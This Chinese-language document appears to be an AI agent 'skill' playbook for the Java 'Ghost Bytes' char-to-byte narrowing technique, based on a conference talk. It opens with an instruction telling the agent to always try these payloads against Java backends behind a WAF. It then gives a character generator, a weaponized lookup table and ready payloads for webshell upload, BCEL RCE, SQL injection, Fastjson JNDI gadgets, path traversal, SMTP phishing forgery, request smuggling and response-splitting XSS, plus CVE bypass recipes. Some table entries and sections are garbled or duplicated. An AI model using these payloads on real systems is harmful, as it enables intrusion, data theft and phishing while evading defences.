# 技能：幽灵字节 / 投掷攻击 — Java char 到 byte 窄化操作手册

> **AI 加载指令**：这是一个仅适用于 Java 的注入启用原语，而非独立的漏洞类别。只要您看到 (1) Java 后端、(2) 前端存在 WAF/IDS，以及 (3) 菜单中包含 {SQLi、反序列化 RCE、文件上传、路径遍历、CRLF、请求走私、SMTP 注入} 中的任何一项，就**始终**在宣告其“被拦截”之前尝试 Ghost Bytes 变种的载荷。根本原因是 Java 代码在将 16 位 `char` 窄化为 8 位 `byte` 时，会静默丢失高位 8 位——WAF 看到的是无害的 Unicode 字符，而后端则重建了原始的 ASCII 攻击字节。基础模型几乎不会使用这种原语。

> 来源：Black Hat Asia 2026 演讲 *Cast Attack: Java 中 Ghost Bytes 带来的新威胁*，演讲者：Xinyu Bai (@b1u3r), Zhihui Chen (@1ue)，贡献者：Zongzheng Zheng (@chun_springX)。

## 0. 相关路由

Ghost Bytes 是一种*绕过*原语，它使来自许多其他操作手册的载荷重新启用。根据适用的攻击家族进行组合：

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — 当怀疑 Java 后端且 WAF 规则拦截字面载荷时，这是在经典编码之外的第一个尝试的技术。
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — 用于 Apache Commons BCEL ClassLoader 和 Fastjson `\u`/`\x` 转义变体。
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring、Jetty、Undertow、Vert.x URL 解码和 `%2>` 十六进制折叠。
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — Tomcat `RFC2231Utility` `filename*` Webshell 上传。
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient `<= 4.5.9` (HTTPCLIENT-1974/1978) 头部 CRLF。
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail SMTP 注入和 JDK HttpServer 响应拆分。
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex` 表格查找截断隐藏 SQL 关键字在 Unicode 转义序列中。

### 高级参考

当您需要时加载 [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md)：

- 完整的字节到幽灵字符查找表，涵盖所有可打印的 ASCII 字节 0x20–0x7E 以及最有用的控制字节 (0x00, 0x09, 0x0A, 0x0D)。
- 每个组件受影响的版本矩阵和补丁标识符。
- Yaklang 和 Python 单行载荷生成器（用于 `poc.HTTP`、`codec.Encode`、原始套接字）。
- “多视图归一化引擎”伪代码，用于蓝队 WAF 检测。

---

## 1. 一分钟思维模型

Java 的 `char` 是一个 **16 位** 无符号整数（UTF-16 代码单元）。几乎每个网络协议——HTTP/1.1、SMTP、Redis RESP、文件路径、原始字节流——都是 **8 位** 字节导向的。正确的方式是显式字符集编码：

```
// 正确：显式 UTF-8，多字节字符变为多字节序列
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

大量遗留代码、框架内部组件和“快速路径”优化跳过这一步并静默窄化：

```
// 危险：高位 8 位静默丢失
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) 保留低 8 位
dos.writeBytes(str);         // DataOutputStream 循环 char->byte 转换
int v = ch & 0xFF;           // 显式低字节掩码
```

丢失的高位 8 位就是 **幽灵字节**。它们将多字节 Unicode 字符转换为协议层上的单个攻击者选择的 ASCII 字节。

```
视图 A（字符串层：WAF / 业务验证 / 日志）
  看到：陪 阮 严 灵 瘍 瘊 ...   "无害的 Unicode 垃圾，允许"
                  |
                  v       调用栈中的某个地方静默窄化
视图 B（字节层：协议 / 文件系统 / 解析器 / 类加载器）
  看到：j  .  %  u  \r \n ...  "执行危险的操作"

边界在“视图 A”和“视图 B”不一致的精确时刻被突破。
```

数学公式：为了使视图 B 看到字节 `T`，选择任何 `k in 0x01..0xFF` 并使用：

```
c = chr((k << 8) | T)
```

这为您提供了**每個危險的字节 255 个候选 Unicode 字符**——足够的空间来躲避任何基于签名的黑名单。

---

## 2. 三个根本原因家族

Ghost Bytes 框架涵盖了三个不同的底层错误。区分它们告诉您*要发送哪种载荷形状*以及*要在源代码中搜索什么*。

### 家族 A — 真实的高位截断（经典 Ghost Bytes）

窄化是字面值且无条件的。

```java
// 模式 A1：显式转换
byte b = (byte) ch;

// 模式 A2：按位掩码
int v = ch & 0xFF;
int v = ch & 255;

// 模式 A3：OutputStream.write(int) 仅保留低 8 位
out.write(ch);
baos.write(ch);

// 模式 A4：DataOutputStream.writeBytes(String) 迭代字符，
//             写入每个字符的低字节
dos.writeBytes(str);

// 模式 A5：遗留 API 在旧代码中仍然存在
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

典型影响：Tomcat `filename*`、Apache BCEL ClassLoader、Lettuce Redis 写入器、Angus Mail 中的 SMTP CRLF、HTTPCLIENT-1974 头部注入。

### 家族 B — 位运算折叠（非法字符变为合法）

一个“快速”的十六进制 / Base64 / 字符集解码器使用位技巧而不是严格的范围检查，因此一个非法字符会折叠到一个合法字符上。

```java
// Jetty TypeUtil.fromHexDigit（简化）
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // 保留低 5 位
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // 预期 0..15，但没有范围检查
}
```

工作示例：提供 `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

所以 `%2>` 被静默解析为 `%2E` = `.`。相同的代数使 `%2^`、`%2~` 等等效于其他十六进制数字。

典型影响：Openfire CVE-2023-32315、GeoServer CVE-2024-36401、通用 URL 解码 WAF 绕过。

### 家族 C — 宽松的 Unicode 规范化

解码器接受恰好被分类为“数字”的 Unicode 字符，或者通过 `& 0xFF` 查找映射到十六进制值的字符——尽管它们从未打算参与协议解析。

```java
// Fastjson：过于宽松
Character.digit(c, 16);   // 接受泰语、旁遮普语、全宽数字

// Jackson：按低 8 位索引到仅 ASCII 的表格
return sHexValues[ch & 0xff];

// 通用：全宽规范化
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

典型影响：Fastjson `\u` 和 `\x` 转义绕过、全宽 URL 编码路径遍历、Jackson `charToHex` SQLi 装载。

---

## 3. 字符生成器

动态构建任何 Ghost Bytes 字符。这是每个代理都应该记住的单一函数：

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """返回一个低 8 位等于 target_byte 的 Unicode 字符。"""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 每个字节 255 个候选者，例如对于 '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-前缀-..., 等。
```

```yak
// Yaklang（用于 poc.HTTP / 混淆）
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // 返回 "陪"
```

选择指导：

- 避免代理范围 `0xD800..0xDFFF`（高位字节 0xD8..0xDF）——这些不是有效的标量值，并且将在到达窄化位置之前被 JVM 字符串解码器替换，从而击败绕过。
- 优先选择在应用程序自己的字符集往返过程中幸存下来的字符（拉丁扩展、CJK 统一表意文字、封闭的 CJK 字母和月份、韩文）。如果请求体使用 UTF-8，这些都将干净地编码为多字节序列，WAF 规则不识别为 `.`, `/`, `j`, 等。
- 在请求之间旋转 `k`，以便基于签名的学习无法将单个字符与单个攻击关联。

---

## 4. 危险字节到幽灵字符映射

紧凑的红队武器化表格。对于攻击者实际需要的每个字节，给出一个经过验证的 Unicode 字符；如果 WAF 后来学习了示例，请替换另一个 `k`。

| 目标字节 | 十六进制 | 用于                          | 幽灵字符 | 代码点 |
|----------|----------|-----------------------------|----------|--------|
| `\t`     | 0x09     | 头部折叠、解析器混淆      | `ĉ`     | U+0109  |
| `\n`     | 0x0A     | CRLF 注入、日志注入         | `瘊`     | U+760A  |
| `\r`     | 0x0D     | CRLF 注入、请求走私         | `瘍`     | U+760D  |
| ` `     | 0x20     | 头部中断、命令分隔符       | `Ġ`     | U+0120  |
| `"`     | 0x22     | JSON / 引号打印的字符串中断 | `Ģ`     | U+0122  |
| `%`     | 0x25     | URL 编码前缀、第二次解码    | `严`     | U+4E25  |
| `&`     | 0x26     | 参数分隔符                   | `Ȧ`     | U+0226  |
| `'`     | 0x27     | SQL 字符串中断               | `ȧ`     | U+0227  |
| `(`     | 0x28     | EL/SpEL/OGNL 语法           | `Ȩ`     | U+0228  |
| `)`     | 0x29     | EL/SpEL/OGNL 语法           | `ȩ`     | U+0229  |
| `.`     | 0x2E     | 路径遍历、扩展             | `阮`     | U+962E  |
| `/`     | 0x2F     | 路径分隔符                   | `丯`     | U+4E2F  |
| `0`     | 0x30     | 十六进制数字构建            | `丰`     | U+4E30  |
| `1`     | 0x31     | 十六进制数字构建            | `失`     | U+5931  |
| `2`     | 0x32     | 十六进制数字构建            | `甲`     | U+7532  |
| `3`     | 0x33     | 十六进制数字构建            | `耳`     | U+8033  |
| `;`     | 0x3B     | 命令分隔符、头部延续         | `Ȼ`     | U+023B  |
| `<`     | 0x3C     | XSS / XML 标签开始         | `ȼ`     | U+023C  |
| `=`     | 0x3D     | 参数 / 头部值               | `Ƚ`     | U+023D  |
| `>`     | 0x3E     | XSS / XML 标签结束         | `Ⱦ`     | U+023E  |
| `@`     | 0x40     | Fastjson `@type`、邮件地址     | `ŀ`     | U+0140  |
| `a`     | 0x61     | 关键字 `class`、字母表         | `ᙡ`     | U+1661  |
| `c`     | 0x63     | 关键字 `class`、`cmd`        | `㹣`     | U+3E63  |
| `e`     | 0x65     | 十六进制数字                 | `来`     | U+6765  |
| `j`     | 0x6A     | 扩展 `.jsp`                  | `陪`     | U+966A  |
| `l`     | 0x6C     | 关键字 `class`、`闭包`        | `౬`     | U+0C6C  |
| `n`     | 0x6E     | 关键字 `Runtime`、`联合`        | `陮`     | U+966E  |
| `s`     | 1.73     | 关键字 `class`、`select`        | `⑳`     | U+2473  |
| `t`     | 0x74     | 关键字 `Runtime`、`类型`        | `Ŵ`     | U+0174  |
| `u`     | 0x75     | `\u` 转义引入符                | `灵`     | U+7075  |

工作流程提示：保留 ASCII `Ŀ`, `ȧ`, `ȼ`, 等. 变体用于紧密的 HTTP 头部上下文（一个字节 UTF-8 扩展保持较小）；使用 CJK 如 `阮`, `陪`, `严` 当您希望引导 WAF “这只是文本” 分类器时。

---

## 5. 组件级载荷配方

每个配方都显示了双重视图：WAF 检查的内容与后端实际执行的内容。这是解释载荷为何能够通过的唯一可靠方法。

### 5.1 Tomcat `RFC2231Utility` — 文件上传 Webshell（家族 A）

触发：任何接受 multipart 上传且 Tomcat 解析 `Content-Disposition: ... filename*=UTF-8''...` 的端点。Tomcat 的 RFC2231 解码器将每个非百分号字符直接转换为字节，静默丢失高位 8 位。

载荷：

```
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"
```

| 阶段                  | 它看到的名字         |
|------------------------|--------------------------|
| WAF / 扩展过滤器        | `shell.陪sp`（不是 `.jsp`, 允许） |
| Tomcat RFC2231 解码器 | `陪` -> 低字节 0x6A -> `j` |
| 文件系统            | `shell.jsp`            |

在需要时与来自第 4 节的遍历字符（`阮`, `丯`）组合，当上传目标目录是固定的但应用程序接受 `filename*` 时。

### 5.2 Apache Commons BCEL — ClassLoader RCE（家族 A）

触发：任何通过 `BCEL` 解析类名的汇点，或任何解码 BCEL 的代码（通过 `JavaReader` -> `ByteArrayOutputStream` 循环）。

易受攻击的形状：

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // 仅保留低 8 位
}
```

攻击：将恶意 BCEL 字节码的每个字节包装在低 8 位等于该字节的 Unicode 字符中。解码的字节流是一个有效的 BCEL 类；WAF 看到的是长串的 CJK 文本，没有 `$$BCEL$$` 关键字或类签名。

| 视图 | 内容 |
|------|---------|
| WAF  | `$$BCEL$$` 后跟看起来随机的 CJK |
| BCEL | 标准 BCEL 类文件字节 → JVM defineClass → RCE |

蓝队防御：一个检查 BCEL 的 WAF 必须在模式匹配之前在每个字符上复制 `bos.write(ch)` 语义。

### 5.3 Jackson `charToHex` — SQLi 装载（家族 C）

触发：任何 Jackson 解析的 JSON 字段，其值稍后嵌入到 SQL 或另一个解析器中。Jackson 通过以下方式解析 `\uXXXX` 数字：

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // 掩码第一个，查找第二个
}
```

任何非 ASCII 字符，其低 8 位落在填充索引上，将返回该十六进制数字。WAF 看到的是乱码；Jackson 重建了 ASCII 载荷。

载荷（将数字 `1` 装载为 UNION 列计数）：

```json
{"q": "\u丰丰耳失 union select 1,2,3-- "}
```

| 视图    | 内容                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (没有前导数字)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

与 [sqli-sql-injection](../sqli-sql-injection/SKILL.md) 配合使用，用于下游 UNION / 布尔 / 时间戳载荷模板。

### 5.4 Fastjson — `\u` 和 `\x` 转义绕过（家族 B + C）

两个独立表面：

(a) `\u` 转义 — `Character.digit(c, 16)` 接受超出 ASCII 的 Unicode 数字类别（泰语 `๐-๙` U+0E50..U+0E59, 旁遮普语 `੦-੯` U+0A66..U+0A6F, 全宽 `０-９` U+FF10..U+FF19).

```json
{"\u۴_type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}
```

WAF 视图：`\u۴_type`（没有 `@type` 文字）。Fastjson 归一化全宽 `۴` 为 `4`，然后通过下面的 `\x` 短切处理 `_`，生成 `@type`。

(b) `\x` 转义 — Fastjson 计算 `digits[x1] * 16 + digits[x2]`. 一个非法十六进制字符返回默认值 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}
```

| 视图     | 字段名 |
|----------|--------|
| WAF      | `\x4_type` (不是 `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl 自动类型小工具触发 |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL 解码（家族 A + B）

两个可组合技巧：

技巧 1 — 家族 A 字符替换在路径或查询中：

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd 在字节层
```

技巧 2 — 当 Jetty 的 `TypeUtil.fromHexDigit` 在链中时 `%2>` 折叠：

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp 解码后
```

单独使用任何一个都可以绕过大多数签名 WAF；组合它们可以存活即使“归一化然后匹配”的规则只看到 ASCII 百分号三字节。

Spring CVE-2025-41242 链（`StringUtils.uriDecode` 在 PR #34673 中修补）：

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  通过路径遍历读取任意文件
```

| 阶段           | 路径           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — 没有字面值 `..`, 允许 |
| 后端文件解析  | `..` 在 `%u002e` 解码后 → 遍历 |

### 5.6 Angus Mail / Jakarta Mail — SMTP 注入（家族 A）

触发：任何应用程序从用户控制的字符串构建 SMTP 信封或头部。内部 `ASCIIUtility` 执行：

```java
byte b = (byte) ch;           // 16 位 char 静默窄化
```

将 CRLF 装载为 `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| 视图 | 它解析的内容 |
|------|----------------|
| 应用程序验证 | 一个包含奇数 CJK 的单个 `From` 值 |
| SMTP 服务器            | 五个单独的头部行 + 正文，完全伪造 |

真实影响模式：Jira 风格（CVE-2025-57733）密码重置劫持，Confluence 域允许列表绕过——与 [crlf-injection](../crlf-injection/SKILL.md) 配合使用非邮件 CRLF 重用。

### 5.7 Apache HttpClient `<=4.5.9` — 请求走私（家族 A）

HTTPCLIENT-1974 / HTTPCLIENT-1978：头部值通过 `OutputStreamWriter` 加密，加上一个窄化转换写入原始 `\r\n`，用于 `\u760D\u760A`。

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| 跳转 | 它看到的内容 |
|-----|-------------|
| 前代理 / WAF | 一个具有长 `X-Auth-Token` 的请求 |
| 源点            | 两个请求；第二个是 admin POST |

一旦确认了不同步，请参考 [request-smuggling](../request-smuggling/SKILL.md) 进行选择前缀攻击。

### 5.8 JDK HttpServer — 响应拆分（CVE-2026-21933, 家族 A）

反射用户输入到响应头部通过 `com.sun.net.httpserver` 写入器，这些写入器对每个字符进行低字节转换。

载荷（URL 参数或上游头部）：

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

服务器发出两个逻辑响应；第二个携带攻击者选择的正文。升级到存储 XSS、缓存中毒和 SSO 重定向链。

### 5.9 其他受影响的组件

相同的家族 A 原语，不同的汇点：

- **Lettuce（Redis 客户端）** — 通过将 `\r\n` 装载到 RESP 帧中实现命令注入；链到任意 `CONFIG SET dir` + `SAVE` 以实现 SSRF-to-RCE。
- **Jodd `FileNameUtil`** — 通过 `阮` 和 `丯` 实现路径遍历，因为它的内部写入循环进行窄化。
- **XMLWriter** — 当属性或文本节点值被推送到低字节写入器时，发生标签名注入；XXE / XSS 拐点。
- **ActiveJ HTTP** — 与 5.7 / 5.8 完全相同的 CRLF 注入形状。
- **Vert.x HTTP 正文解析器** — 家族 A 在 `MultipartParser` 中。

查看 [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) 获取受影响版本矩阵和每个组件的完整载荷骨架。

---

## 6. 已知 CVE 绕过配方

当对应的 CVE 已修补但 WAF 仍然作为服务前端时使用这些*精确地*。每个载荷都将原始 ASCII 攻击转换为一种能够存活基于字符串的 WAF 规则的形式。

### Openfire CVE-2023-32315 — 身份验证绕过（家族 B）

原始公开绕过：

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bytes / `%2>` 折叠绕过（更难进行签名）：

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

每个 `%2>` 通过 Jetty 的宽松十六进制解析折叠为 `%2E` = `.`，从而产生相同的 `../../` 遍历，而不会向 WAF 发送 `..` 或 `%2e`。

### GeoServer CVE-2024-36401 — 通过 `Runtime` 关键字的 RCE（家族 B）

公共 WAF 规则通常阻止 `Runtime`。注入一个折叠字符：

```
Ru%6>time
```

解码数学：`%6>` -> `%6E` -> `n`. 表达式求值器现在看到 `Runtime`，WAF 从未见过。

### Spring4Shell 名称*类走私（家族 A）

需要参数前缀 `class.module.classLoader...`。通过低字节字符替换：

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."
```

| 组件 | 字符 | 代码点 | 低字节 |
|-------|-------|--------|--------|
| `c`   | `㹣`   | U+3E63  | 0x63    |
| `l`   | `౬`   | U+0C6C  | 0x6C    |
| `a`   | `ᙡ`   | U+1661  | 0x61    |
| `s`   | `⑳`   | U+2473  | 0x73    |
| `s`   | `⑳`   | U+2473  | 0x73    |

Spring 的参数名解析器窄化回 `class`。

### Spring CVE-2025-41242 路径读取（家族 A + 家族 B 混合）

已在 5.5 中演示。载荷 `阮严灵丰丰甲来` ->
`.%u002e` -> `..` 解码后验证。

### Angus Mail / Jira 邮件劫持（家族 A）

```
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234
```

邮件离开公司 SMTP 服务器时具有有效的 SPF / DKIM / DMARC，但其 `To:` 和 `Subject:` 是攻击者选择的——高保真钓鱼。

### Apache HttpClient ≤4.5.9 装载走私（家族 A）

HTTPCLIENT-1974 / HTTPCLIENT-1978：头部值通过 `OutputStreamWriter` 加密，加上一个窄化转换写入原始 `\r\n`，用于 `\u760D\u760A`。

```
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>
```

服务器发出两个逻辑响应；第二个携带攻击者选择的正文。升级到存储 XSS、缓存中毒和 SSO 重定向链。

### SAST 第一遍 grep

```
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## 参考文献

- Black Hat Asia 2026 — *Cast Attack: Java 中 Ghost Bytes 带来的新威胁*。演讲者：Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue)。贡献者：Zongzheng Zheng (@chun_springX)。
- 重新启用的现实 CVEs：GeoServer CVE-2024-36401、Spring4Shell CVE-2022-22965、Openfire CVE-2023-32315、Spring CVE-2025-41242、Jakarta Mail CVE-2025-57733、JDK HttpServer CVE-2026-21933、Apache HttpClient HTTPCLIENT-1974 / HTTPCLIENT-1978。
- 要升级到已修补组件：Apache Commons BCEL >= 6.12.0、Fastjson 2.x 最新、Apache HttpClient >= 4.5.10（或迁移到 5.x）、GeoServer >= 2.28.3、Openfire >= 5.0.4。在使用任何单个版本号之前，请确认供应商公告。
